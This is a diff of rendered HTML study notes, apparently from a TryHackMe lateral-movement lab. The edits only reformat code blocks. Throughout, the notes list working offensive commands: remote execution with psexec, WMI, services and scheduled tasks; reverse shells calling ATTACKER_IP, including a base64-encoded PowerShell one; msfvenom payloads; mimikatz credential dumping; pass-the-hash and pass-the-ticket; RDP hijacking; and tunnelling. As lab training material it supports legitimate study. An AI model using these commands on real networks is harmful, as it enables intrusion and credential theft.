@@ -160,7 +160,7 @@ Then visited http://distributor.za.tryhackme.com/creds to get my user level cred
 <li>Creates named pipes to handle stdin/stdout/stderr</li>
 </ul>
 </li>
-<li><pre><code data-lang="cmd">psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
 </code></pre>
 </li>
 </ul>
@@ -169,7 +169,7 @@ Then visited http://distributor.za.tryhackme.com/creds to get my user level cred
 <ul>
 <li>Required group: Remote Management Users</li>
 <li>Web based protocol to send powershell commands, most windows servers have it enabled</li>
-<li><pre><code data-lang="bash">    winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
 </code></pre>
 </li>
 </ul>
@@ -184,7 +184,7 @@ Then visited http://distributor.za.tryhackme.com/creds to get my user level cred
 <li>Method 2: Try to reach SVCCTL through smb named pipes pipesvcctl</li>
 </ul>
 </li>
-<li><pre><code data-lang="shell">    sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto
+<li><pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">    sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 &#x2F;add&quot; start= auto
     sc.exe \\TARGET start THMservice
     sc.exe \\TARGET stop THMservice
     sc.exe \\TARGET delete THMservice
@@ -195,9 +195,9 @@ Then visited http://distributor.za.tryhackme.com/creds to get my user level cred
 </li>
 <li><strong>Remote Schedule Tasks</strong>
 <ul>
-<li><pre><code data-lang="shell">   schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00 
-   schtasks /s TARGET /run /TN &quot;THMtask1&quot; 
-   schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F
+<li><pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">   schtasks &#x2F;s TARGET &#x2F;RU &quot;SYSTEM&quot; &#x2F;create &#x2F;tn &quot;THMtask1&quot; &#x2F;tr &quot;&lt;command&#x2F;payload to execute&gt;&quot; &#x2F;sc ONCE &#x2F;sd 01&#x2F;01&#x2F;1970 &#x2F;st 00:00 
+   schtasks &#x2F;s TARGET &#x2F;run &#x2F;TN &quot;THMtask1&quot; 
+   schtasks &#x2F;S TARGET &#x2F;TN &quot;THMtask1&quot; &#x2F;DELETE &#x2F;F
 </code></pre>
 </li>
 </ul>
@@ -210,7 +210,7 @@ Then visited http://distributor.za.tryhackme.com/creds to get my user level cred
 <li>First, I established a reverse shell on THMJMP2 as leonard summers
 <ul>
 <li><pre><code>```powershell
-runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe LOCAL_IP_ADDR 4444&quot;
+runas &#x2F;netonly &#x2F;user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe LOCAL_IP_ADDR 4444&quot;
 ```
 </code></pre>
 </li>
@@ -218,7 +218,7 @@ runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe
 </li>
 <li>Then, I used psexec to execute a powershell one-liner
 <ul>
-<li><pre><code data-lang="powershell">   psexec64 \\10.200.48.201 powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANQAwAC4ANAA2AC4AMgAwADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">   psexec64 \\10.200.48.201 powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANQAwAC4ANAA2AC4AMgAwADcAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 </code></pre>
 </li>
 <li>I wasn't planning on using a base64 encoded one (generated at revshells.com) but psexec got fussy with the quotes in the regular payload</li>
@@ -234,15 +234,15 @@ runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe
 <li><strong>Connecting to  WMI From Powershell</strong>
 <ul>
 <li>First we need a <strong>PSCredential object</strong></li>
-<li><pre><code data-lang="powershell">    $username = &#39;Administrator&#39;;
-    $password = &#39;Mypass123&#39;;
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    $username = &#x27;Administrator&#x27;;
+    $password = &#x27;Mypass123&#x27;;
     $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
     $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
     ```
 </code></pre>
 </li>
 <li>Then we need to create a session</li>
-<li><pre><code data-lang="powershell">    $Opt = New-CimSessionOption -Protocol DCOM
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    $Opt = New-CimSessionOption -Protocol DCOM
     $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
     ```
 </code></pre>
@@ -253,7 +253,7 @@ runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe
 collapsed:: true
 <ul>
 <li>Required group: Administrator</li>
-<li><pre><code data-lang="powershell">    $Command = &quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;;
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    $Command = &quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;;
     
     Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
     CommandLine = $Command
@@ -263,7 +263,7 @@ collapsed:: true
 </li>
 <li>Not output provided</li>
 <li>Can also use cmd</li>
-<li><pre><code data-lang="cmd">    wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create &quot;cmd.exe /c calc.exe&quot; 
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    wmic.exe &#x2F;user:Administrator &#x2F;password:Mypass123 &#x2F;node:TARGET process call create &quot;cmd.exe &#x2F;c calc.exe&quot; 
     ```
 </code></pre>
 </li>
@@ -273,15 +273,15 @@ collapsed:: true
 collapsed:: true
 <ul>
 <li>Required group: Administrator</li>
-<li><pre><code data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
     Name = &quot;THMService2&quot;;
     DisplayName = &quot;THMService2&quot;;
-    PathName = &quot;net user munra2 Pass123 /add&quot;; # Your payload
+    PathName = &quot;net user munra2 Pass123 &#x2F;add&quot;; # Your payload
     ServiceType = [byte]::Parse(&quot;16&quot;); # Win32OwnProcess : Start service in a new process
     StartMode = &quot;Manual&quot;
     }
     
-    $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#39;THMService2&#39;&quot;
+    $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#x27;THMService2&#x27;&quot;
     Invoke-CimMethod -InputObject $Service -MethodName StartService
     
     Invoke-CimMethod -InputObject $Service -MethodName StopService
@@ -295,8 +295,8 @@ collapsed:: true
 collapsed:: true
 <ul>
 <li>Group: Adminstrator</li>
-<li><pre><code data-lang="powershell">   $Command = &quot;cmd.exe&quot;
-   $Args = &quot;/c net user munra22 aSdf1234 /add&quot;
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">   $Command = &quot;cmd.exe&quot;
+   $Args = &quot;&#x2F;c net user munra22 aSdf1234 &#x2F;add&quot;
    $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
    Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\SYSTEM&quot; -TaskName &quot;THMtask2&quot;
    Start-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot;
@@ -310,12 +310,12 @@ collapsed:: true
 <ul>
 <li>Group: Administrator</li>
 <li>MSI File must already be on target system</li>
-<li><pre><code data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;; Options = &quot;&quot;; AllUsers = $false}
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;; Options = &quot;&quot;; AllUsers = $false}
     ```
 </code></pre>
 </li>
 <li>Can also use wmic in legacy systems</li>
-<li><pre><code data-lang="cmd">    wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    wmic &#x2F;node:TARGET &#x2F;user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
     ```
 </code></pre>
 </li>
@@ -326,8 +326,8 @@ collapsed:: true
 <li>Connect to THM-IIS using MSI installation</li>
 <li>First we need to create and upload a payload
 <ul>
-<li><pre><code data-lang="bash">    msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi &gt; myinstaller.msi
-    smbclient -c &#39;put myinstaller.msi&#39; -U t1_corine.waters -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; Korine.1994
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi &gt; myinstaller.msi
+    smbclient -c &#x27;put myinstaller.msi&#x27; -U t1_corine.waters -W ZA &#x27;&#x2F;&#x2F;thmiis.za.tryhackme.com&#x2F;admin$&#x2F;&#x27; Korine.1994
     ```
 </code></pre>
 </li>
@@ -336,7 +336,7 @@ collapsed:: true
 </li>
 <li>We need to create a listener for the payload
 <ul>
-<li><pre><code data-lang="bash">    nc -nvlp 4445
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    nc -nvlp 4445
     ```
 </code></pre>
 </li>
@@ -346,7 +346,7 @@ collapsed:: true
 <ul>
 <li><em>Same steps as connection to wmi session</em></li>
 <li>Then we install the msi</li>
-<li><pre><code data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\Windows\secretinstall.msi&quot;; Options = &quot;&quot;; AllUsers = $false}
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = &quot;C:\Windows\secretinstall.msi&quot;; Options = &quot;&quot;; AllUsers = $false}
     ```
 </code></pre>
 </li>
@@ -367,7 +367,7 @@ collapsed:: true
 <li>If we extract credentials (maybe with mimikatz) we can use non-cracked ntlm hashes</li>
 <li>Getting them:
 <ul>
-<li><pre><code data-lang="powershell">    mimikatz # privilege::debug
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
     mimikatz # token::elevate
     mimikatz # lsadump::sam   
     
@@ -381,12 +381,12 @@ collapsed:: true
 </li>
 <li>Using them
 <ul>
-<li><pre><code data-lang="bash">    xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
-    psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    xfreerdp &#x2F;v:VICTIM_IP &#x2F;u:DOMAIN\\MyUser &#x2F;pth:NTLM_HASH
+    psexec.py -hashes NTLM_HASH DOMAIN&#x2F;MyUser@VICTIM_IP
     evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
     
     mimikatz # token::revert
-    mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;
+    mimikatz # sekurlsa::pth &#x2F;user:bob.jenkins &#x2F;domain:za.tryhackme.com &#x2F;ntlm:6b4a57f67805a663c818106dc0648484 &#x2F;run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555&quot;
     ```
 </code></pre>
 </li>
@@ -402,8 +402,8 @@ collapsed:: true
 <li><img src="../../assets/5d45b999328017c22b0f249069a88767_1740881361813_0.png" alt="5d45b999328017c22b0f249069a88767.png" /></li>
 <li>Getting tickets
 <ul>
-<li><pre><code data-lang="powershell">    mimikatz # privilege::debug
-    mimikatz # sekurlsa::tickets /export
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
+    mimikatz # sekurlsa::tickets &#x2F;export
     ```
 </code></pre>
 </li>
@@ -411,7 +411,7 @@ collapsed:: true
 </li>
 <li>Using them
 <ul>
-<li><pre><code data-lang="powershell">    mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
     ```
 </code></pre>
 </li>
@@ -425,7 +425,7 @@ collapsed:: true
 <li>
 <p>Get encryption keys</p>
 <ul>
-<li><pre><code data-lang="powershell">    mimikatz # privilege::debug
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
     mimikatz # sekurlsa::ekeys
     ```
 </code></pre>
@@ -438,12 +438,12 @@ mimikatz #sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24
 </li>
 <li>
 <p>If we have the AES128 hash:</p>
-<pre><code>mimikatz  sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:&quot;c:toolsnc64.exe -e cmd.exe ATTACKER_IP 5556&quot;  
+<pre><code>mimikatz  sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:za.tryhackme.com &#x2F;aes128:b65ea8151f13a31d01377f5934bf3883 &#x2F;run:&quot;c:toolsnc64.exe -e cmd.exe ATTACKER_IP 5556&quot;  
 </code></pre>
 </li>
 <li>
 <p>If we have the AES256 hash:</p>
-<pre><code>mimikatz  sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:&quot;c:toolsnc64.exe -e cmd.exe ATTACKER_IP 5556&quot;  
+<pre><code>mimikatz  sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:za.tryhackme.com &#x2F;aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 &#x2F;run:&quot;c:toolsnc64.exe -e cmd.exe ATTACKER_IP 5556&quot;  
 </code></pre>
 </li>
 </ul>
@@ -456,7 +456,7 @@ collapsed:: true
 <li>SSH with new credentials provided</li>
 <li>Get ntlm ham by using mimikatz
 <ul>
-<li><pre><code data-lang="powershell">    mimikatz # privilege::debug
+<li><pre data-lang="powershell" class="language-powershell "><code class="language-powershell" data-lang="powershell">    mimikatz # privilege::debug
     mimikatz # token::elevate
     mimikatz # sekurlsa::msv 
     ```
@@ -467,7 +467,7 @@ collapsed:: true
 </li>
 <li>Exploit this
 <ul>
-<li><pre><code data-lang="bash">    evil-winrm -i 10.200.48.201 -u t1_toby.beck -H 533f1bd576caa912bdb9da284bbc60fe
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    evil-winrm -i 10.200.48.201 -u t1_toby.beck -H 533f1bd576caa912bdb9da284bbc60fe
     ```
 </code></pre>
 </li>
@@ -493,7 +493,7 @@ collapsed:: true
 <ul>
 <li>Exe
 <ul>
-<li><pre><code data-lang="bash">    msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    msfvenom -a x64 --platform windows -x putty.exe -k -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b &quot;\x00&quot; -f exe -o puttyX.exe
     ```
 </code></pre>
 </li>
@@ -501,7 +501,7 @@ collapsed:: true
 </li>
 <li>VBS
 <ul>
-<li><pre><code data-lang="vbscript">    CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True
+<li><pre data-lang="vbscript" class="language-vbscript "><code class="language-vbscript" data-lang="vbscript">    CreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe &#x2F;c copy &#x2F;Y \\10.10.28.6\myshare\nc64.exe %tmp% &amp; %tmp%\nc64.exe -e cmd.exe &lt;attacker_ip&gt; 1234&quot;, 0, True
     ```
 </code></pre>
 </li>
@@ -515,8 +515,8 @@ collapsed:: true
 <ul>
 <li>If an rdp client closes instead of logging off, session remains indefinitely</li>
 <li>Can access with system privileges</li>
-<li><pre><code data-lang="cmd">    query user   # Retruns sessions
-    tscon 3 /dest:rdp-tcp#6
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    query user   # Retruns sessions
+    tscon 3 &#x2F;dest:rdp-tcp#6
     ```
 </code></pre>
 </li>
@@ -527,7 +527,7 @@ collapsed:: true
 <li>RDP in with our new credentials (different link than before)</li>
 <li>Switch to system
 <ul>
-<li><pre><code data-lang="cmd">    PsExec64.exe -s cmd.exe
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    PsExec64.exe -s cmd.exe
     ```
 </code></pre>
 </li>
@@ -535,8 +535,8 @@ collapsed:: true
 </li>
 <li>Find and connect to rdp
 <ul>
-<li><pre><code data-lang="cmd">    query user
-    tscon &lt;any of the ids for the target user&gt; /dest:rdp-tcp#&lt;Your session&gt;
+<li><pre data-lang="cmd" class="language-cmd "><code class="language-cmd" data-lang="cmd">    query user
+    tscon &lt;any of the ids for the target user&gt; &#x2F;dest:rdp-tcp#&lt;Your session&gt;
     ```
 </code></pre>
 </li>
@@ -550,12 +550,12 @@ collapsed:: true
 <li><strong>SSH Tunnelling</strong>
 <ul>
 <li>Allows us to forward ports or traffic through another machine we have ssh access to</li>
-<li><pre><code data-lang="bash">    ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
     This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.
     ```
 </code></pre>
 </li>
-<li><pre><code data-lang="bash">    To forward port 80 from the attacker&#39;s machine and make it available from PC-1, we can run the following command on PC-1:
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    To forward port 80 from the attacker&#x27;s machine and make it available from PC-1, we can run the following command on PC-1:
     C:\&gt; ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
     ```
 </code></pre>
@@ -565,12 +565,12 @@ collapsed:: true
 <li><strong>SOCAT</strong>
 <ul>
 <li>Doesn't require ssh, but requires us to transfer the socat binary</li>
-<li><pre><code data-lang="bash">    Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:       
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:       
     C:\&gt;socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
     ```
 </code></pre>
 </li>
-<li><pre><code data-lang="bash">    If, on the other hand, we&#39;d like to expose port 80 from the attacker&#39;s machine so that it is reachable by the server, we only need to adjust the command a bit:
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    If, on the other hand, we&#x27;d like to expose port 80 from the attacker&#x27;s machine so that it is reachable by the server, we only need to adjust the command a bit:
     C:\&gt;socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
     ```
 </code></pre>
@@ -581,7 +581,7 @@ collapsed:: true
 <ul>
 <li>For if we need multiple ports, ex nmap</li>
 <li>Create socks proxy with ssh and connect with proxychains</li>
-<li><pre><code data-lang="bash">    ssh tunneluser@1.1.1.1 -R 9050 -N
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    ssh tunneluser@1.1.1.1 -R 9050 -N
     proxychains nmap -T4 -p- Target
     ```
 </code></pre>
@@ -593,7 +593,7 @@ collapsed:: true
 <li>Part 1, RDP to THMIIS
 <ul>
 <li>Port is blocked from our machine but allowed from thmjmp2</li>
-<li><pre><code data-lang="bash">    socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
     ```
 </code></pre>
 </li>
@@ -607,7 +607,7 @@ collapsed:: true
 <li>DC can only talk to jmp2</li>
 <li>Forward ssh ports
 <ul>
-<li><pre><code data-lang="bash">    C:\Users\t2_kelly.blake&gt;ssh tunnel@10.50.46.207 -R 8888:thmdc.za.tryhackme.com:80 -L *:6565:127.0.0.1:6565 -L *:6868:127.0.0.1:6868 -N 
+<li><pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">    C:\Users\t2_kelly.blake&gt;ssh tunnel@10.50.46.207 -R 8888:thmdc.za.tryhackme.com:80 -L *:6565:127.0.0.1:6565 -L *:6868:127.0.0.1:6868 -N 
     ```
 </code></pre>
 </li>
